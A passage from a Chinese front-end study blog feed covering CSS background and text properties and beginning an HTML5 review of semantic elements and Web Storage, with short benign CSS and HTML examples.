背景图像（background-image）</h3><p>描述了元素的背景图像。默认情况下，背景图像进行平铺重复显示，以覆盖整个元素实体。</p><p>使用实例：页面背景图片设置</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;paper.gif&#x27;</span>);&#125;<br></code></pre></div></td></tr></table></figure><h4 id="4-2-1-水平或垂直平铺"><a href="#4-2-1-水平或垂直平铺" class="headerlink" title="4.2.1 水平或垂直平铺"></a>4.2.1 水平或垂直平铺</h4><p>如果需要在 HTML 页面上对背景图像进行平铺，可以使用 background-repeat 属性。默认情况下 background-image 属性会在页面的水平或者垂直方向平铺。</p><table><thead><tr><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">repeat</td><td align="center">默认。背景图像将在垂直方向和水平方向重复。</td></tr><tr><td align="center">repeat-x</td><td align="center">背景图像将在水平方向重复。</td></tr><tr><td align="center">repeat-y</td><td align="center">背景图像将在垂直方向重复。</td></tr><tr><td align="center">no-repeat</td><td align="center">背景图像将仅显示一次。</td></tr><tr><td align="center">inherit</td><td align="center">规定应该从父元素继承 background-repeat 属性的设置。</td></tr></tbody></table><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;gradient2.png&#x27;</span>); &#125;<br></code></pre></div></td></tr></table></figure><p>使用实例2：只在水平方向平铺 (repeat-x) </p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;gradient2.png&#x27;</span>);<br><span class="hljs-attribute">background-repeat</span>:repeat-x;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="4-2-2-设置定位与不平铺"><a href="#4-2-2-设置定位与不平铺" class="headerlink" title="4.2.2 设置定位与不平铺"></a>4.2.2 设置定位与不平铺</h4><p>如果不想让图像平铺，可以使用 background-repeat 属性:</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);<br><span class="hljs-attribute">background-repeat</span>:no-repeat;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>利用 background-position 属性改变图像在背景中的位置:</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);<br><span class="hljs-attribute">background-repeat</span>:no-repeat;<br><span class="hljs-attribute">background-position</span><span class="hljs-selector-pseudo">:right</span> <span class="hljs-attribute">top</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>background-position 属性提供值有很多方法。首先，可以使用一些关键字：top、bottom、left、right 和 center；其次，可以使用长度值，如 100px 或 5cm；最后也可以使用百分数值。不同类型的值对于背景图像的放置稍有差异。</p><h5 id="4-2-2-1-关键字"><a href="#4-2-2-1-关键字" class="headerlink" title="4.2.2.1 关键字"></a>4.2.2.1 关键字</h5><p>图像放置关键字最容易理解的作用就像其名字的意义。例如，top left 使图像放置在元素内边距区的左上角。只要保证不超过两个关键字：一个对应水平方向，另一个对应垂直方向，那么你可以设置位置关键字以任何顺序出现。如果只有一个关键字，则会默认另一个关键字为 center。</p><p>如果希望每个段落的中部上方出现一个图像，使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);        <br><span class="hljs-attribute">background-repeat</span>:no-repeat;            <br><span class="hljs-attribute">background-position</span>:top;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="4-2-2-2-百分数值"><a href="#4-2-2-2-百分数值" class="headerlink" title="4.2.2.2 百分数值"></a>4.2.2.2 百分数值</h5><p>百分数值的表现方式更为复杂。<br>若希望用百分数值将图像在其元素中居中，使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);  <br><span class="hljs-attribute">background-repeat</span>:no-repeat;    <br><span class="hljs-attribute">background-position</span>:<span class="hljs-number">50%</span> <span class="hljs-number">50%</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>若想把一个图像放在水平方向 2/3、垂直方向 1/3 处：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);   <br><span class="hljs-attribute">background-repeat</span>:no-repeat;   <br><span class="hljs-attribute">background-position</span>:<span class="hljs-number">66%</span> <span class="hljs-number">33%</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="4-2-2-3-长度值"><a href="#4-2-2-3-长度值" class="headerlink" title="4.2.2.3 长度值"></a>4.2.2.3 长度值</h5><p>长度值解释的是元素内边距区左上角的偏移，偏移点是图像的左上角。</p><p>如果设置值为 50px 100px，图像的左上角将在元素内边距区左上角向右 50 像素、向下 100 像素的位置上：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>);<br><span class="hljs-attribute">background-repeat</span>:no-repeat;<br><span class="hljs-attribute">background-position</span>:<span class="hljs-number">50px</span> <span class="hljs-number">100px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>这一点与百分数值不同，因为偏移只是从一个左上角到另一个左上角。也就是说，图像的左上角与 background-position 声明中的指定的点对齐。</p><h4 id="4-2-3-简写属性"><a href="#4-2-3-简写属性" class="headerlink" title="4.2.3 简写属性"></a>4.2.3 简写属性</h4><p>为了简化这些属性的代码，可以将这些属性合并在同一个属性中。背景颜色的简写属性为 “background”:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background</span>:<span class="hljs-number">#ffffff</span> <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;img_tree.png&#x27;</span>) no-repeat right top;&#125;<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>使用简写属性时，属性值的顺序为：</p><blockquote><ol><li>background-color</li><li>background-image</li><li>background-repeat</li><li>background-attachment</li><li>background-position</li></ol></blockquote><p>以上属性无需全部使用，可以按照页面的实际需要使用。</p><h2 id="5-文本（text）"><a href="#5-文本（text）" class="headerlink" title="5. 文本（text）"></a>5. 文本（text）</h2><p>通过 CSS 的 Text 属性，你可以改变页面中文本的颜色、字符间距、对齐文本、装饰文本、对文本进行缩进等等。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">color</td><td align="center">设置文本颜色</td></tr><tr><td align="center">direction</td><td align="center">设置文本方向。</td></tr><tr><td align="center">letter-spacing</td><td align="center">设置字符间距</td></tr><tr><td align="center">line-height</td><td align="center">设置行高</td></tr><tr><td align="center">text-align</td><td align="center">对齐元素中的文本</td></tr><tr><td align="center">text-decoration</td><td align="center">向文本添加修饰</td></tr><tr><td align="center">text-indent</td><td align="center">缩进元素中文本的首行</td></tr><tr><td align="center">text-shadow</td><td align="center">设置文本阴影</td></tr><tr><td align="center">text-transform</td><td align="center">控制元素中的字母</td></tr><tr><td align="center">unicode-bidi</td><td align="center">设置或返回文本是否被重写</td></tr><tr><td align="center">vertical-align</td><td align="center">设置元素的垂直对齐</td></tr><tr><td align="center">white-space</td><td align="center">设置元素中空白的处理方式</td></tr><tr><td align="center">word-spacing</td><td align="center">设置字间距</td></tr></tbody></table><h3 id="5-1-颜色（color）"><a href="#5-1-颜色（color）" class="headerlink" title="5.1 颜色（color）"></a>5.1 颜色（color）</h3><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;<br><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#00ff00</span>;&#125;<br><span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-built_in">rgb</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);&#125;<br></code></pre></div></td></tr></table></figure><p>对于 W3C 标准的 CSS：如果你定义了颜色属性，你还必须定义背景色属性。</p><h3 id="5-2-文本的对齐方式（text-align）"><a href="#5-2-文本的对齐方式（text-align）" class="headerlink" title="5.2 文本的对齐方式（text-align）"></a>5.2 文本的对齐方式（text-align）</h3><p>文本排列属性是用来设置文本的水平对齐方式。文本可居中或对齐到左或右,两端对齐。</p><p>当 text-align 设置为justify，每一行被展开为宽度相等，左，右外边距是对齐（如杂志和报纸）。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">text-align</span>:center;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.date</span> &#123;<span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:right</span>;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.main</span> &#123;<span class="hljs-attribute">text-align</span>:justify;&#125;<br></code></pre></div></td></tr></table></figure><p>如果想把一个行内元素的第一行“缩进”，可以用左内边距或外边距创造这种效果。</p><h3 id="5-3-文本修饰（text-decoration）"><a href="#5-3-文本修饰（text-decoration）" class="headerlink" title="5.3 文本修饰（text-decoration）"></a>5.3 文本修饰（text-decoration）</h3><p>text-decoration属性用来设置或删除文本的装饰。从设计的角度看 text-decoration 属性主要是用来删除链接的下划线。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span> &#123;<span class="hljs-attribute">text-decoration</span>:none;&#125;<br></code></pre></div></td></tr></table></figure><p>也可以这样装饰文字。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">text-decoration</span>:overline;&#125;<br><span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">text-decoration</span>:line-through;&#125;<br><span class="hljs-selector-tag">h3</span> &#123;<span class="hljs-attribute">text-decoration</span>:underline;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-4-文本转换（text-transform）"><a href="#5-4-文本转换（text-transform）" class="headerlink" title="5.4 文本转换（text-transform）"></a>5.4 文本转换（text-transform）</h3><p>文本转换属性是用来指定在一个文本中的大写和小写字母。可用于所有字句变成大写或小写字母，或每个单词的首字母大写。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.uppercase</span> &#123;<span class="hljs-attribute">text-transform</span>:uppercase;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.lowercase</span> &#123;<span class="hljs-attribute">text-transform</span>:lowercase;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.capitalize</span> &#123;<span class="hljs-attribute">text-transform</span>:capitalize;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-5-文本缩进（text-indent）"><a href="#5-5-文本缩进（text-indent）" class="headerlink" title="5.5 文本缩进（text-indent）"></a>5.5 文本缩进（text-indent）</h3><p>文本缩进属性是用来指定文本的第一行的缩进。CSS 提供了 text-indent 属性，该属性可以方便地实现文本缩进。通过使用 text-indent 属性，所有元素的第一行都可以缩进一个给定的长度。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">text-indent</span>:<span class="hljs-number">50px</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-6-文本间隔（word-spacing）"><a href="#5-6-文本间隔（word-spacing）" class="headerlink" title="5.6 文本间隔（word-spacing）"></a>5.6 文本间隔（word-spacing）</h3><p>word-spacing 属性可以改变字（单词）之间的标准间隔。其默认值 normal 与设置值为 0 是一样的。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">word-spacing</span>:<span class="hljs-number">30px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML5基础知识复习（四）</title>
    <link href="/2021/05/12/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2021/05/12/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML5规范于2014年10月29日由万维网联盟正式宣布，HTML是万维网最核心的超文本标记语言。万维网不等同于互联网，但它是依靠互联网运行的服务之一，万维网又简写为www，它可以实现在互联网的帮助下，访问由许多互相链接的超文本组成的系统。现代的浏览器都支持 HTML5。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-语义元素"><a href="#1-语义元素" class="headerlink" title="1.语义元素"></a>1.语义元素</h2><p>语义= 意义。<br>语义元素 = 元素的意义。<br>一个语义元素能够清楚的描述其意义给浏览器和开发者。</p><p><strong>新语义元素</strong></p><ul><li>&lt;header&gt;</li><li>&lt;nav&gt;</li><li>&lt;section&gt;</li><li>&lt;article&gt;</li><li>&lt;aside&gt;</li><li>&lt;figcaption&gt;</li><li>&lt;figure&gt;</li><li>&lt;footer&gt;</li></ul><p><img src="https://img-blog.csdnimg.cn/20210512153653905.gif"></p><h3 id="1-1-lt-header-gt-元素"><a href="#1-1-lt-header-gt-元素" class="headerlink" title="1.1 &lt;header&gt;元素"></a>1.1 &lt;header&gt;元素</h3><p>&lt;header&gt;元素描述了文档的头部区域。&lt;header&gt;元素注意用于定义内容的介绍展示区域。在页面中你可以使用多个&lt;header&gt; 元素。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Internet Explorer 9<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">pubdate</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;2011-03-15&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Windows Internet Explorer 9 (abbreviated as IE9) was released to<br>  the  public on March 14, 2011 at 21:00 PDT.....<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-lt-nav-gt-元素"><a href="#1-2-lt-nav-gt-元素" class="headerlink" title="1.2 &lt;nav&gt;元素"></a>1.2 &lt;nav&gt;元素</h3><p>&lt;nav&gt; 标签定义导航链接的部分。&gt;nav&lt; 元素用于定义页面的导航链接部分区域。<br>不是所有的链接都需要包含在 &lt;nav&gt; 元素中!</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/html/&quot;</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/css/&quot;</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/js/&quot;</span>&gt;</span>JavaScript<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/jquery/&quot;</span>&gt;</span>jQuery<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-lt-section-gt-元素"><a href="#1-3-lt-section-gt-元素" class="headerlink" title="1.3 &lt;section&gt;元素"></a>1.3 &lt;section&gt;元素</h3><p>&lt;section&gt; 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。<br>根据W3C HTML5文档: section 包含了一组内容及其标题。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>WWF<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The World Wide Fund for Nature (WWF) is....<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-lt-article-gt-元素"><a href="#1-4-lt-article-gt-元素" class="headerlink" title="1.4 &lt;article&gt;元素"></a>1.4 &lt;article&gt;元素</h3><p>&lt;article&gt; 标签定义独立的内容。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Internet Explorer 9<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Windows Internet Explorer 9 (abbreviated as IE9) was released to<br>  the  public on March 14, 2011 at 21:00 PDT.....<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-5-lt-aside-gt-元素"><a href="#1-5-lt-aside-gt-元素" class="headerlink" title="1.5 &lt;aside&gt;元素"></a>1.5 &lt;aside&gt;元素</h3><p>&lt;aside&gt; 标签定义页面主区域内容之外的内容（比如侧边栏）。aside 标签的内容应与主区域的内容相关。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>My family and I visited The Epcot center this summer.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">aside</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Epcot Center<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The Epcot Center is a theme park in Disney World, Florida.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-6-lt-footer-gt-元素"><a href="#1-6-lt-footer-gt-元素" class="headerlink" title="1.6 &lt;footer&gt;元素"></a>1.6 &lt;footer&gt;元素</h3><p>&lt;footer&gt; 元素描述了文档的底部区域。<br>&lt;footer&gt; 元素应该包含它的包含元素。一个页脚通常包含文档的作者，著作权信息，链接的使用条款，联系信息等。文档中你可以使用多个 &lt;footer&gt;元素。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Posted by: Hege Refsnes<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">pubdate</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;2012-03-01&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-7-lt-figcaption-gt-与-lt-figure-gt-元素"><a href="#1-7-lt-figcaption-gt-与-lt-figure-gt-元素" class="headerlink" title="1.7 &lt;figcaption&gt;与&lt;figure&gt;元素"></a>1.7 &lt;figcaption&gt;与&lt;figure&gt;元素</h3><p>&lt;figure&gt;标签规定独立的流内容（图像、图表、照片、代码等等）。</p><p>&lt;figure&gt; 元素的内容应该与主内容相关，但如果被删除，则不应对文档流产生影响。</p><p>&lt;figcaption&gt;标签定义 &lt;figure&gt; 元素的标题。</p><p>&lt;figcaption&gt;元素应该被置于 “figure” 元素的第一个或最后一个子元素的位置。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img_pulpit.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;The Pulpit Rock&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;304&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;228&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">figcaption</span>&gt;</span>Fig1. - The Pulpit Pock, Norway.<span class="hljs-tag">&lt;/<span class="hljs-name">figcaption</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-Web存储"><a href="#2-Web存储" class="headerlink" title="2.Web存储"></a>2.Web存储</h2><p>在HTML5之前，主要是使用cookies存储，cookies的缺点有：需要在请求头上带着数据，存储大小不过在4k之内。<br>使用HTML5可以在本地存储用户的浏览数据，比cookie更好的本地存储方式。</p><h3 id="2-1-localStorage-和-sessionStorage"><a href="#2-1-localStorage-和-sessionStorage" class="headerlink" title="2.1 localStorage 和 sessionStorage"></a>2.1 localStorage 和 sessionStorage</h3><p>客户端存储数据的两个对象为：</p><ul><li>localStorage - 没有时间限制的数据存储</li><li>sessionStorage - 针对一个 session 的数据存储</li></ul><p>在使用 web 存储前,应检查浏览器是否支持 localStorage 和sessionStorage: </p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if(typeof(Storage)!==&quot;undefined&quot;)        <br>  &#123;        <br>  // 是的! 支持 localStorage  sessionStorage 对象!         <br>  // 一些代码.....         <br>  &#125;        <br>else        <br>  &#123;        <br>  // 抱歉! 不支持 web 存储。         <br>  &#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-1-1-localStorage-对象"><a href="#2-1-1-localStorage-对象" class="headerlink" title="2.1.1 localStorage 对象"></a>2.1.1 localStorage 对象</h4><p>localStorage 对象存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div 